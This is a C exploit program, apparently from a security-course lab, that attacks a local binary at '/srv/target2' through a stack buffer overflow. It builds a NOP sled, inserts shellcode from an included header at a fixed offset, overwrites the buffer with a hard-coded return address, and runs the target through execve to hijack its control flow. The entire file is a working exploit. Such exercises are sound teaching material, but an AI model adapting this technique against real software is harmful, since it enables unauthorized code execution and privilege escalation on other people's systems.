#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"
#define BUFFER_SIZE 409

int main(void) {
    char *args[4];
    char *env[1];
    char buf[BUFFER_SIZE]; // Buffer to store the payload

    // Fill the buffer with NOPs
    memset(buf, 0x90, sizeof(buf) - 1);

    int offset = 201; // Offset where the shellcode is to be placed in the buffer

    // Copy the shellcode into the buffer at the specified offset
    memcpy(buf + offset, shellcode, sizeof(shellcode) - 1);

    // Fill the remaining space after the shellcode with the return address
    uint32_t return_address = 0xffffdb5c;
    for (int i = offset + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
        *(uint32_t *)(buf + i) = return_address;
    }

    // Ensure the buffer is null-terminated
    buf[BUFFER_SIZE - 1] = '\0';

    // Setup arguments for executing the target program
    args[0] = TARGET;
    args[1] = buf;
    args[2] = "65935";
    args[3] = NULL;

    // Environment variable array terminated properly
    env[0] = NULL;

    // Execute the target binary with the crafted exploit
    if (execve(TARGET, args, env) < 0) {
        fprintf(stderr, "execve failed.\n");
    }

    return 0;
}
